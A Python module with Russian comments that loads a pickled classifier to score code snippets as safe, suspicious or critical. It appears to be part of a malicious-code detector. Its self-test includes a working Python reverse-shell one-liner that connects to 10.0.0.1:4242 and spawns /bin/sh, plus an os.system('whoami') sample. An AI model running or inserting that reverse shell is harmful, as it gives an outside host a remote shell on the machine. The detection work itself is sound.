import joblib
import os

class FluxLocalEngine:
    def __init__(self, model_path="flux_local_model.pkl"):
        """
        Инициализация движка инференса и загрузка обученной модели.
        """
        if not os.path.exists(model_path):
            raise FileNotFoundError(
                f"Ошибка: Файл модели '{model_path}' не найден. "
                "Пожалуйста, запустите '2_train_local_ml.py' для обучения модели."
            )
        
        try:
            self.model = joblib.load(model_path)
            print(f"[*] Модель '{model_path}' успешно загружена.")
        except Exception as e:
            raise RuntimeError(f"Ошибка при загрузке модели: {e}")

    def predict_code(self, code_snippet: str) -> dict:
        """
        Анализирует фрагмент кода и возвращает вердикт безопасности.
        """
        # Получаем вероятности для каждого класса [0, 1]
        # self.model.predict_proba ожидает список/массив
        probabilities = self.model.predict_proba([code_snippet])[0]
        
        # Вероятность класса 1 (Malicious)
        malicious_prob = probabilities[1]
        risk_score = int(malicious_prob * 100)
        
        # Логика определения статуса
        if malicious_prob > 0.70:
            status = "CRITICAL"
        elif 0.40 <= malicious_prob <= 0.70:
            status = "SUSPICIOUS"
        else:
            status = "SAFE"
            
        return {
            "status": status,
            "risk_score": risk_score,
            "probability_float": float(malicious_prob)
        }

if __name__ == "__main__":
    # Тестирование движка
    try:
        engine = FluxLocalEngine()
        
        test_cases = [
            {
                "name": "Безопасный код",
                "code": "print('Hello, secure world!')\nfor i in range(5):\n    print(i)"
            },
            {
                "name": "Вредоносный код (Reverse Shell)",
                "code": "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
            },
            {
                "name": "Подозрительный код (System execution)",
                "code": "import os\ncmd = 'whoami'\nos.system(cmd)"
            }
        ]
        
        print("\n" + "="*50)
        print("РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ ИНФЕРЕНСА")
        print("="*50)
        
        for case in test_cases:
            result = engine.predict_code(case['code'])
            print(f"\nТест: {case['name']}")
            print(f"Код: {case['code'][:50]}...")
            print(f"Статус: {result['status']}")
            print(f"Risk Score: {result['risk_score']}%")
            print(f"Probability: {result['probability_float']:.4f}")
            print("-" * 30)
            
    except Exception as e:
        print(f"Критическая ошибка: {e}")